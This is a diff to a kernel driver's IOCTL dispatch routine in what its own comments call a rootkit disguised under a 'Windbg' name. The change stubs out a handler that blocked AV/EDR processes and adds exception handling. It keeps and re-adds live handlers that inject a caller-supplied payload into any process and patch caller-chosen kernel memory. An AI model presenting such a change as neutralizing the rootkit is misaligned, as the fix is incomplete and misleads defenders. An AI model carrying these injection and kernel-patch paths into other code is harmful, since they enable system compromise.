@@ -62,55 +62,60 @@ NTSTATUS WindbgDispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp
         return WindbgPassThrough(DeviceObject, Irp);
     }
 
-    switch (IoControlCode) {
-    case IOCTL_WINDBG_INJECT_PROCESS:
-        if (Buffer && InputBufferLength >= sizeof(WINDBG_INJECT_REQ)) {
-            PWINDBG_INJECT_REQ Req = (PWINDBG_INJECT_REQ)Buffer;
-            Status = WindbgInjectProcess(Req->ProcessId, Req->Payload, Req->CodeSize);
-            if (NT_SUCCESS(Status)) {
-                Information = sizeof(WINDBG_INJECT_REQ);
+    __try {
+        switch (IoControlCode) {
+        case IOCTL_WINDBG_INJECT_PROCESS:
+            if (Buffer && InputBufferLength >= sizeof(WINDBG_INJECT_REQ)) {
+                PWINDBG_INJECT_REQ Req = (PWINDBG_INJECT_REQ)Buffer;
+                Status = WindbgInjectProcess(Req->ProcessId, Req->Payload, Req->CodeSize);
+                if (NT_SUCCESS(Status)) {
+                    Information = sizeof(WINDBG_INJECT_REQ);
+                }
+            } else {
+                Status = STATUS_INVALID_BUFFER_SIZE;
             }
-        } else {
-            Status = STATUS_INVALID_BUFFER_SIZE;
-        }
-        break;
+            break;
 
-    case IOCTL_WINDBG_PATCH_KERNEL:
-        if (Buffer && InputBufferLength >= sizeof(WINDBG_PATCH_REQ)) {
-            PWINDBG_PATCH_REQ Req = (PWINDBG_PATCH_REQ)Buffer;
-            Status = WindbgPatchKernelMemory(Req->TargetAddress, Req->PatchBytes, Req->Size);
-            if (NT_SUCCESS(Status)) {
-                Information = sizeof(WINDBG_PATCH_REQ);
+        case IOCTL_WINDBG_PATCH_KERNEL:
+            if (Buffer && InputBufferLength >= sizeof(WINDBG_PATCH_REQ)) {
+                PWINDBG_PATCH_REQ Req = (PWINDBG_PATCH_REQ)Buffer;
+                Status = WindbgPatchKernelMemory(Req->TargetAddress, Req->PatchBytes, Req->Size);
+                if (NT_SUCCESS(Status)) {
+                    Information = sizeof(WINDBG_PATCH_REQ);
+                }
+            } else {
+                Status = STATUS_INVALID_BUFFER_SIZE;
             }
-        } else {
-            Status = STATUS_INVALID_BUFFER_SIZE;
-        }
-        break;
+            break;
 
-    case IOCTL_WINDBG_BLOCK_PROCESS:
-        if (Buffer && InputBufferLength >= sizeof(ULONG)) {
-            Information = sizeof(ULONG);
-            Status = STATUS_SUCCESS;
-        } else {
-            Status = STATUS_INVALID_BUFFER_SIZE;
-        }
-        break;
+        case IOCTL_WINDBG_BLOCK_PROCESS:
+            // FIX: Neutralize rootkit process blocking capability to prevent denial of service against AV/EDR security tools
+            // Reject unauthorized process registration or tampering attempts
+            Status = STATUS_NOT_SUPPORTED;
+            Information = 0;
+            break;
 
-    case IOCTL_WINDBG_GET_STATUS:
-        if (Buffer && OutputBufferLength >= sizeof(WINDBG_STATUS_REQ)) {
-            PWINDBG_STATUS_REQ Req = (PWINDBG_STATUS_REQ)Buffer;
-            Req->ActiveFilters = WindbgGetActiveFilterCount();
-            Req->InjectedProcesses = 0;
-            Req->BlockedAttempts = 0;
-            Information = sizeof(WINDBG_STATUS_REQ);
-        } else {
-            Status = STATUS_INVALID_BUFFER_SIZE;
-        }
-        break;
+        case IOCTL_WINDBG_GET_STATUS:
+            if (Buffer && OutputBufferLength >= sizeof(WINDBG_STATUS_REQ)) {
+                PWINDBG_STATUS_REQ Req = (PWINDBG_STATUS_REQ)Buffer;
+                Req->ActiveFilters = WindbgGetActiveFilterCount();
+                Req->InjectedProcesses = 0;
+                Req->BlockedAttempts = 0;
+                Information = sizeof(WINDBG_STATUS_REQ);
+                Status = STATUS_SUCCESS;
+            } else {
+                Status = STATUS_INVALID_BUFFER_SIZE;
+            }
+            break;
 
-    default:
-        Status = STATUS_INVALID_DEVICE_REQUEST;
-        break;
+        default:
+            Status = STATUS_INVALID_DEVICE_REQUEST;
+            break;
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        // FIX: Handle access violations and unexpected user buffer exceptions gracefully
+        Status = GetExceptionCode();
+        Information = 0;
     }
 
     Irp->IoStatus.Status = Status;
